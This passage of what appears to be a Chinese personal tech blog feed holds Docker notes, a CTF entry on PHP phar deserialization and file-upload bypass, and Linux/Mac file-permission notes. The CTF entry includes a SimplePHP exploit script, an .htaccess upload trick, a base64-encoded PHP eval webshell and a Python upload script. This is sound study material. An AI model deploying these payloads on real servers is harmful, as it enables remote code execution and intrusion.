上新建一层，过多无意义的层，会造成镜像膨胀过大</p><p>正确写法是用<code>\</code>表示分行，<code>&amp;&amp;</code>链接命令</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> centos<br><span class="hljs-keyword">RUN</span><span class="language-bash"> yum -y install wget \</span><br><span class="language-bash"> &amp;&amp; wget -O redis.tar.gz <span class="hljs-string">&quot;http://download.redis.io/releases/redis-5.0.3.tar.gz&quot;</span> \</span><br><span class="language-bash"> &amp;&amp; tar -xvf redis.tar.gz</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="COPY"><a href="#COPY" class="headerlink" title="COPY"></a>COPY</h3><p>复制指令，可以从上下文目录中复制文件或目录到容器内指定路径</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bnf">COPY [--chown=<span class="hljs-attribute">&lt;user&gt;</span>:<span class="hljs-attribute">&lt;group&gt;</span>] <span class="hljs-attribute">&lt;源路径1&gt;</span>...  <span class="hljs-attribute">&lt;目标路径&gt;</span><br>COPY [--chown=<span class="hljs-attribute">&lt;user&gt;</span>:<span class="hljs-attribute">&lt;group&gt;</span>] [&quot;<span class="hljs-attribute">&lt;源路径1&gt;</span>&quot;,...  &quot;<span class="hljs-attribute">&lt;目标路径&gt;</span>&quot;]<br></code></pre></td></tr></table></figure><ul><li><p>**[–chown&#x3D;<user>:<group>]**：可选参数，用户改变复制到容器内文件的拥有者和属组</p></li><li><p>**&lt;源路径&gt;**：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs vim">pattern:<br>&#123; term &#125;<br>term:<br><span class="hljs-string">&#x27;*&#x27;</span>                                  匹配<span class="hljs-number">0</span>或多个非路径分隔符的字符<br><span class="hljs-string">&#x27;?&#x27;</span>                                  匹配<span class="hljs-number">1</span>个非路径分隔符的字符<br><span class="hljs-string">&#x27;[&#x27;</span> [ <span class="hljs-string">&#x27;^&#x27;</span> ] &#123; character-<span class="hljs-built_in">range</span> &#125; <span class="hljs-string">&#x27;]&#x27;</span>  字符组（必须非空）<br><span class="hljs-keyword">c</span>                                    匹配字符<span class="hljs-keyword">c</span>（<span class="hljs-keyword">c</span> != <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;[&#x27;</span>）<br><span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">c</span>                               匹配字符<span class="hljs-keyword">c</span><br>character-<span class="hljs-built_in">range</span>:<br><span class="hljs-keyword">c</span>           匹配字符<span class="hljs-keyword">c</span>（<span class="hljs-keyword">c</span> != <span class="hljs-string">&#x27;\\&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;]&#x27;</span>）<br><span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">c</span>      匹配字符<span class="hljs-keyword">c</span><br><span class="hljs-keyword">lo</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">hi</span>   匹配区间[<span class="hljs-keyword">lo</span>, <span class="hljs-keyword">hi</span>]内的字符<br><br></code></pre></td></tr></table></figure></li><li><p>**&lt;目标路径&gt;**：容器内的指定路径，该路径不用事先建好，<u>路径不存在的话，会自动创建</u>。</p></li></ul><h2 id="镜像源拉取超时问题"><a href="#镜像源拉取超时问题" class="headerlink" title="镜像源拉取超时问题"></a>镜像源拉取超时问题</h2><p>将dockerfile中的</p><p><a href="http://link.zhihu.com/?target=http://k8s.gcr.io">k8s.gcr.io</a> —&gt; lank8s.cn<br><a href="http://link.zhihu.com/?target=http://gcr.io">gcr.io</a> –&gt; gcr.lank8s.cn</p>]]></content>
      
      
      <categories>
          
          <category> utils </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phar反序列化</title>
      <link href="/2022/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/01/03/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h1><h3 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h3><p>1.a stub<br>    可以理解为一个标志，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面内容不限，但必须以__HALT_COMPILER();来结尾，否则phar扩展将无法识别这个文件为phar文件<br>2.a manifest describing the contents<br>    phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方<br>3.the file contents—被压缩文件的内容<br>4.[optional] a signature for verifying Phar integrity (phar file format only)—签名，放在文件末尾</p><h3 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>会在同目录生成 phar.phar 文件</p><p>注意：要想生成phar文件，必须将phar.readonly配置项配置为0或Off,并且删除行首分号，在行尾加. 否则无法生成phar文件</p></blockquote><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>meta-data是以序列化的形式存储的</p><p>php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>，测试后受影响的函数如下</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221511.jpg" alt="image-20211018194419673"></p><h3 id="SWPUCTF-2018-SimplePHP-EXP"><a href="#SWPUCTF-2018-SimplePHP-EXP" class="headerlink" title="[SWPUCTF 2018]SimplePHP EXP"></a>[SWPUCTF 2018]SimplePHP EXP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>&#125;<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>-&gt;params=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;source&#x27;</span>=&gt;<span class="hljs-string">&#x27;var/www/html/f1ag.php&#x27;</span>);<span class="hljs-comment">//flag所在路径</span><br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<span class="hljs-comment">//为了不存在的调用触发__get()</span><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$a</span>-&gt;str=<span class="hljs-variable">$b</span>;<span class="hljs-comment">//触发__toString()</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>(); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加图片类型文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//meta-data储存的信息</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//生成签名</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><blockquote><p>要想生成phar文件，必须将php.ini中phar.readonly配置项配置为0或Off,并且删除行首分号，在行尾加.</p><p>生成的phar中metada.bin内容为类序列化后的内容</p></blockquote><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="绕过-lt-过滤"><a href="#绕过-lt-过滤" class="headerlink" title="绕过&lt;?过滤"></a>绕过&lt;?过滤</h3><p>.htaccess绕过文件头检查</p><p>如果用一般的<code>GIF89a</code>文件头绕过，会导致htaccess文件无法执行，因此这里用定义高度与宽度，#在htaccess中被视为注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs htaccess">#define width 1337<br>#define height 1337<br>AddType application/x-httpd-php .a<br>php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;<br></code></pre></td></tr></table></figure><p>shell.a内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a11<br>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==<br></code></pre></td></tr></table></figure><blockquote><p>文件头后加的内容是为了补足8个字节，满足base64编码规则</p></blockquote><h3 id="文件上传python脚本"><a href="#文件上传python脚本" class="headerlink" title="文件上传python脚本"></a>文件上传python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">r&quot;http://7c586462-a2f1-4008-a870-9303b30d8fb1.node4.buuoj.cn/?_=$&#123;%80%80%80%80^%df%c7%c5%d4&#125;&#123;%80&#125;();&amp;%80=get_the_flag&quot;</span> <span class="hljs-comment"># 执行get_the_flag函数</span><br>session = requests.session()<br>htaccess_content = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">#define width 1337</span><br><span class="hljs-string">#define height 1337</span><br><span class="hljs-string">AddType application/x-httpd-php .a</span><br><span class="hljs-string">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.a&quot;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>files_htaccess = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<br>    <span class="hljs-string">&#x27;.htaccess&#x27;</span>, htaccess_content, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>res_hta = session.post(url, files=files_htaccess)<br><span class="hljs-built_in">print</span>(res_hta.text)<br>shell_file = <span class="hljs-string">&#x27;GIF89a12PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTs/Pg==&#x27;</span><br>files_shell = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<br>    <span class="hljs-string">&#x27;shell.a&#x27;</span>, shell_file, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>)&#125;<br>res_jpg = session.post(url, files=files_shell)<br><br><span class="hljs-built_in">print</span>(res_jpg.text)  <span class="hljs-comment"># 打印路径</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux与MAC文件、目录与磁盘格式</title>
      <link href="/2021/09/23/Linux%E4%B8%8EMAC%E6%96%87%E4%BB%B6%E3%80%81%E7%9B%AE%E5%BD%95%E4%B8%8E%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/"/>
      <url>/2021/09/23/Linux%E4%B8%8EMAC%E6%96%87%E4%BB%B6%E3%80%81%E7%9B%AE%E5%BD%95%E4%B8%8E%E7%A3%81%E7%9B%98%E6%A0%BC%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux与MAC-OS文件、目录学习笔记"><a href="#Linux与MAC-OS文件、目录学习笔记" class="headerlink" title="Linux与MAC OS文件、目录学习笔记"></a>Linux与MAC OS文件、目录学习笔记</h1><h2 id="0x01-文件权限"><a href="#0x01-文件权限" class="headerlink" title="0x01 文件权限"></a>0x01 文件权限</h2><h3 id="用户与用户组"><a href="#用户与用户组" class="headerlink" title="用户与用户组"></a>用户与用户组</h3><p>在Linux或MAC下多个用户可以共用一个系统&#x2F;一台服务器，因此系统既要包含各用户<strong>共用文件</strong>及各自<strong>私有文件</strong>，在这种情况下权限配置显得极其重要。但是若用户间是合作团队关系，可以互相访问各自私有文件，若还是采用分别对用户进行文件访问授权，显得效率低下，因此产生了用户组，使得组内用户获得与组相同权限，用户组实质上是具有相同特征用户的逻辑集合。</p><h4 id="root用户及其用户组"><a href="#root用户及其用户组" class="headerlink" title="root用户及其用户组"></a>root用户及其用户组</h4><p>Linux中，对于任何一个文件都有”User,Group,Others”3种身份，而对于文件来说root用户便是与User拥有等同权限的特殊Others。root用户组与普通用户组也一样受权限限制，组内用户并没有与root用户等同甚至更高权限。</p><p>而MAC下由于引入系统完整性保护（SIP）机制，连root用户都无法在&#x2F;、&#x2F;usr目录下新建文件</p><blockquote><p>SIP机制一般不建议关闭，在不关闭前提下仍可以利用软链接的方式在根目录下创建替身</p></blockquote><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><p>操作文件时，若看见<code>Permission deny</code>字样，一般是文件权限配置问题。可以通过以下命令通过查看文件属性来查看权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls -al   # 可以查看该目录下所有文件包括隐藏文件(.开头)<br><span class="hljs-meta prompt_"># </span><span class="language-bash">回显</span><br>-rw-r--r--    1   sloth  staff     12288      Nov 26 09:41 .bash_profile.swm<br><span class="hljs-meta prompt_">#</span><span class="language-bash">[文件权限] [连接数][所有者][用户组] [文件容量/B]  [创建/修改日期]      [文件名]</span><br></code></pre></td></tr></table></figure><p>表示为文件权限的字符串由10个字符组成</p><ul><li>第一个字符表示文件类型：d(目录) -(文件) l(连接文件) b(可供存储接口设备) c(串行端口设备)</li><li>2-4三个字符为”rwx”的组合表示<strong>文件所有者的权限</strong>：r(可读) w(可写不包括删除) x(可执行) (删除需要获取父目录的w权限)</li><li>5-7三个字符为”rwx”的组合表示<strong>同用户组的权限</strong></li><li>8-10三个字符为”rwx”的组合表示<strong>其他非本用户组的权限</strong></li></ul><blockquote><p>文件名以<code>.</code>开头的称为隐藏文件，mac下显示隐藏文件快捷键:<code>command+shift+.</code> </p><p>⚠️mac下创建隐藏文件会提示.开头文件以及被系统预留，不能创建</p><p>解决方法：终端输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">defaults write com.apple.finder AppleShowAllFiles -bool YES<br>killall Finder   <br></code></pre></td></tr></table></figure><p>创建完输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">defaults write com.apple.finder AppleShowAllFiles -bool YES<br>killall Finder <br></code></pre></td></tr></table></figure></blockquote><h3 id="文件权限及属性的修改"><a href="#文件权限及属性的修改" class="headerlink" title="文件权限及属性的修改"></a>文件权限及属性的修改</h3><ul><li><p>chgrp：改变文件所属用户组 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chgrp [-R] dirname/filename        # -R:递归更改，改变子目录下所有文件、目录<br></code></pre></td></tr></table></figure></li><li><p>chown：改变文件所有者</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chown [-R] 用户名称[:用户组名] dirname/filename    # 用户名与用户组间连接也可用&#x27;.&#x27;但在用户名中含&#x27;.&#x27;时会造成系统误判，因此不建议<br></code></pre></td></tr></table></figure></li><li><p>chmod：改变文件权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod [-R] [u/g/o/a][+/-/=][r/w/x]/权限分数 dirname/filename    # +与-更多是修改，而=相当于重置(会清空原来设置)<br><span class="hljs-meta prompt_"># </span><span class="language-bash">权限分数的计算</span><br>-rw-r-xr--    <br>[4+2+0][4+0+1][4+0+0]=654   # rwx表示分数分别为4 2 1<br></code></pre></td></tr></table></figure><blockquote><p>对于设置<code>4 2 1</code>的理解：421利于计算机存储，4–100 2–010 1–001 如果设置成<code>3 2 1</code>由于系统只接受了和，而当系统接收到3时，无法判断是赋予读权限还是写+执行权限，会造成歧义</p><p>💡除输入以上命令外，mac下有一种略微简便的修改文件<strong>读写</strong>权限方式，在<code>文件简介</code>中可以修改user、group、all的<u>读写权限</u>(目前还未发现可以加入执行权限的文件类别),递归选项隐藏在左下角</p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h27plpvekkj20m609ewf6.jpg" alt="image-20220514101004553" style="zoom:50%;" /><p>💡mac终端使用小技巧：直接将文件拖入终端会转换成绝对路径(不带引号)</p></blockquote></li></ul><h4 id="终端切换root用户权限"><a href="#终端切换root用户权限" class="headerlink" title="终端切换root用户权限"></a>终端切换root用户权限</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">su -root<br>su -<br>su<br><span class="hljs-meta prompt_"># </span><span class="language-bash">以上三种要求输入root用户密码</span><br>sudo su  # 要求输入当前用户密码，切换到root用户<br></code></pre></td></tr></table></figure><blockquote><p>sudo是一种权限管理机制，依赖于&#x2F;etc&#x2F;sudoers ⚠️⚠️mac上不要轻易修改sudoers文件权限，这会导致终端无法切换root用户，sudo命令失效⚠️⚠️</p><p>补救措施：</p><ul><li>电脑仍能正常开机：<code>&gt;系统偏好设置&gt;用户与群组&gt;左下角开锁🔓&gt;登录选项&gt;网络账户服务器：加入&gt;打开目录实用工具&gt;菜单栏的&#39;编辑&#39;&gt;启用Root用户</code> 以root用户登录后便可在终端重新授权，该方式可以解决大多数<code>xxxx is owned by uid 501, should be 0</code>报错</li><li>电脑不能正常开机：长按电源键进入恢复模式，里面有个终端可以使用，或进入单用户模式进行修改权限操作</li></ul></blockquote><h2 id="0x02-目录结构"><a href="#0x02-目录结构" class="headerlink" title="0x02 目录结构"></a>0x02 目录结构</h2><h3 id="目录配置–FHS标准"><a href="#目录配置–FHS标准" class="headerlink" title="目录配置–FHS标准"></a>目录配置–FHS标准</h3><p>FHS依据文件系统使用的频繁与否以及是否允许用户随意改动，将目录定义为四种交互作用的形态</p><table><thead><tr><th align="left">类别</th><th>说明</th></tr></thead><tbody><tr><td align="left">可分享的(shareable)</td><td>可分享给其他系统挂载使用的目录，包括执行文件与用户的邮件数据等</td></tr><tr><td align="left">不可分享的(unshareable)</td><td>与机器相关的设备文件或与程序相关的socket文件等</td></tr><tr><td align="left">不变的(static)</td><td>内容不会经常变动，函数库、文件说明文件、系统管理员管理的配置文件等</td></tr><tr><td align="left">可变动的(variable)</td><td>登录文件、新闻组</td></tr></tbody></table><h4 id="Linux下根目录的主要子目录"><a href="#Linux下根目录的主要子目录" class="headerlink" title="Linux下根目录的主要子目录"></a>Linux下根目录的主要子目录</h4><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>&#x2F;bin</td><td>存放在单用户模式下仍能执行的终端命令：ls、cat等等</td></tr><tr><td>&#x2F;boot</td><td>存放开机时使用到的文件，包括Linux内核文件、开机菜单、开机所需配置文件等</td></tr><tr><td>&#x2F;dev</td><td>在linux系统上任何设备与接口设备都以文件形式存在该目录下</td></tr><tr><td>&#x2F;etc</td><td>存放系统主要的配置文件，包括人员账号密码、各种服务的起始文件(如mysql的配置文件my.cnf)等   &#x2F;etc&#x2F;init.d存放所有服务的默认启动脚本</td></tr><tr><td>&#x2F;home</td><td>系统默认主文件夹，也是我们打开终端常见到的<code>~</code>   主文件夹的另一种代号：<code>~dmtsai</code>代表dmtsai的主文件夹</td></tr><tr><td>&#x2F;lib</td><td>存放开机时使用到的函数库，以及&#x2F;bin、&#x2F;sbin下命令调用的函数库</td></tr><tr><td>&#x2F;media</td><td>放置可删除的设备，光盘、软盘、DVD等</td></tr><tr><td>&#x2F;mnt</td><td>存放暂时挂载的某些额外设备</td></tr><tr><td>&#x2F;opt</td><td>存放第三方软件(如mac上的软件包神器homebrew)</td></tr><tr><td>&#x2F;root</td><td>root用户的主文件夹,单用户模式下该目录拥有root的主文件夹</td></tr><tr><td>&#x2F;sbin</td><td>开机、修复、还原系统所需命令，这些命令只有root才能够利用来“设置”系统，普通用户只能用于查询</td></tr><tr><td>&#x2F;srv</td><td>srv–service,存放网络服务所需数据目录www等，不过部分云服务器也会将www目录单独出来放在根目录下</td></tr><tr><td>&#x2F;tmp</td><td>用于一般用户或正在执行的程序暂时存放文件，任何人可访问，需定期清理，FHS甚至建议开机时将该目录清空</td></tr><tr><td>&#x2F;lost+found</td><td>使用标准的ext2&#x2F;ext3文件系统格式才会产生的目录，存放文件系统发生错误时的丢失片段</td></tr><tr><td>&#x2F;proc</td><td>虚拟文件系统，不含硬盘空间，放置的数据都是内存当中的，如系统内核、进程、外部设备的状态及网络状态</td></tr><tr><td>&#x2F;sys</td><td>与&#x2F;proc类似，记录内核相关信息</td></tr></tbody></table><blockquote><p>⚠️一定不能与根目录分开的目录：<code>/etc</code> <code>/bin</code> <code>/dev</code> <code>/lib</code> <code>/sbin</code></p></blockquote><h4 id="x2F-usr与-x2F-var"><a href="#x2F-usr与-x2F-var" class="headerlink" title="&#x2F;usr与&#x2F;var"></a>&#x2F;usr与&#x2F;var</h4><p>&#x2F;usr下主要目录 （注：usr–UNIX Software Resource 并不是user的缩写）</p><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>&#x2F;usr&#x2F;bin</td><td>绝大部分用户在终端可使用的命令，与&#x2F;bin的不同(是否与开机有关)</td></tr><tr><td>&#x2F;usr&#x2F;include</td><td>c&#x2F;c++等程序语言的头文件与包含文件，当我们以tarball方式(*.tar.gz)安装数据时，时常用到里面的头文件，装框架的时候不要忘记包含它的include目录(如mac下使用Qt+Clion，就要将Qt的include目录加入CMakeLists.txt)</td></tr><tr><td>&#x2F;usr&#x2F;X11R6</td><td>放置X Window系统重要数据</td></tr><tr><td>&#x2F;usr&#x2F;lib</td><td>各应用软件的函数库、目标文件、不被一般用户惯用的执行文件、脚本   X86_64的Linux系统还有&#x2F;usr&#x2F;lib64</td></tr><tr><td>&#x2F;usr&#x2F;local</td><td>系统管理员在本机自行安装下载的软件</td></tr><tr><td>&#x2F;usr&#x2F;sbin</td><td>非系统正常运行所需命令</td></tr><tr><td>&#x2F;usr&#x2F;share</td><td>共享文件，几乎都是文本文件</td></tr><tr><td>&#x2F;usr&#x2F;src</td><td>建议放置源码 src–source  内核源码建议放在&#x2F;usr&#x2F;src&#x2F;linux</td></tr></tbody></table><p>&#x2F;var下主要目录</p><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>&#x2F;var&#x2F;cache</td><td>应用程序本身运行产生的暂存文件</td></tr><tr><td>&#x2F;var&#x2F;lib</td><td>程序执行所需数据文件存放的目录</td></tr><tr><td>&#x2F;var&#x2F;lock</td><td>一次只能被单一程序使用的文件资源或设备</td></tr><tr><td>&#x2F;var&#x2F;log</td><td>登录文件</td></tr><tr><td>&#x2F;var&#x2F;mail</td><td>个人电子邮件信箱</td></tr><tr><td>&#x2F;var&#x2F;run</td><td>程序或服务启动后的PID</td></tr><tr><td>&#x2F;var&#x2F;spool</td><td>排队等待其他应用程序使用的数据，使用后通常被删除</td></tr></tbody></table><hr><h3 id="mac下根目录结构"><a href="#mac下根目录结构" class="headerlink" title="mac下根目录结构"></a>mac下根目录结构</h3><p>mac根目录一般指<code>macintosh HD</code>,一般情况下可见的只有4个文件夹Applications、Library、System、Users，显示隐藏文件夹后可以看见完整结构</p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2807nwmzlj21f40o8wh4.jpg" alt="image-20220514161710097" style="zoom: 50%;" /><p>可以发现大部分文件都与Linux上一致，不同的有</p><table><thead><tr><th>目录</th><th>内容</th></tr></thead><tbody><tr><td>&#x2F;Applications</td><td>默认所有的GUI应用程序都安装在这里，也是我们使用dmg安装程序时出现在访达框中的”Applications替身”的本体</td></tr><tr><td>&#x2F;cores</td><td>内核转储文(进程崩溃时产生)件存放目录</td></tr><tr><td>&#x2F;private</td><td>存放了&#x2F;tmp, &#x2F;var, 